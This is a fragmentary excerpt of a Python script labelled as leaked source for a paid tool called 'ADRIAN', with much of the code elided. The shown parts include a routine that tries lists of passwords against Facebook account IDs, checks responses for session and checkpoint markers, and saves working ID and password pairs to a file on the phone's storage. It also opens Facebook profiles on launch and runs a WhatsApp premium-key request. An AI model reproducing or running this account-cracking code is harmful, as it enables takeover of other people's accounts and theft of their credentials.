...
#SOURCE LEAKED BY :ADRIAN

#REASON : BECAUSE F*CK ADRIAN 😎 

from os import path

import os,base64,zlib,pip,urllib

os.system('xdg-open https://www.facebook.com/profile.php?id=100067770310839&mibextid=ZbWKwL/')
...
def clear():
        ...
        os.system('xdg-open https://www.facebook.com/profile.php?id=100000961187718&mibextid=ZbWKwL/')
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        tks = ("Hi ADRIAN Sir, I Need To Buy Your Paid ADRIAN PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)

                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)

                        print(' Run :  python ADRIAN.py')
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [ADRIAN-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in ADRIAN:
                                ...
                                print('\r\r\033[1;32m [ADRIAN-CP] %s | %s'%(ids,pas))

                                open('/sdcard/ADRIAN.txt', 'a').write(ids+'|'+pas+'\n')

                                oks.append(ids)

                                break

                        elif 'checkpoint' in ADRIAN:

                                if 'y' in pcp:

                                        print('\r\r\x1b[38;5;208m [ADRIAN-OK] '+ids+' | '+pas+'\033[1;97m')
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [ADRIAN-CP] '+ids+' | '+pas+'\033[1;97m')
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                okk=open('/sdcard/ADRIAN.txt','r').read()

                                                if uid in okk:pass

                                                else:

                                                        print('\r\r\033[1;32m [ADRIAN-CP] '+uid+' | '+pas+'\033[1;97m')

                                                        open('/sdcard/ADRIAN.txt','a').write(uid+'|'+pas+'\n')
